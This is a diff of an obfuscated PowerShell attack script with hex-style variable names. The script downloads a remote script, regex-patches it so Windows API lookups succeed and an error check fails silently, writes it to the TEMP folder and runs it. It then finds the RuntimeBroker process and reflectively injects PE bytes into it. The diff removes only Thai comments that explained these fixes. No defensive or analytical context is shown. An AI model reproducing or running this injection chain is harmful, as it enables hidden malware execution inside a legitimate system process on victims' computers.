@@ -33,15 +33,11 @@ Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
 
 $_0xA77 = Get-Content $_0x8E4 -Raw
 
-# --- ส่วนที่แก้ไขเพื่อแก้ Error ---
-
 $_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
 
 $_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
 
 $_0xA77 = $_0xA77 -replace 'Throw "VoidFunc couldn''t be found in the DLL"', 'Return'
-
-# -------------------------------
 
 $_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
 
@@ -49,14 +45,12 @@ $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
 
-# --- ส่วนที่แก้ไข: หา PID ของ RuntimeBroker อัตโนมัติ ---
 try {
     $_0x2AA = (Get-Process "RuntimeBroker" -ErrorAction Stop | Select-Object -First 1).Id
 } catch {
     Write-Host "ไม่พบ Process RuntimeBroker ในระบบ" -ForegroundColor Red
     exit
 }
-# --------------------------------------------------
 
 Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
 
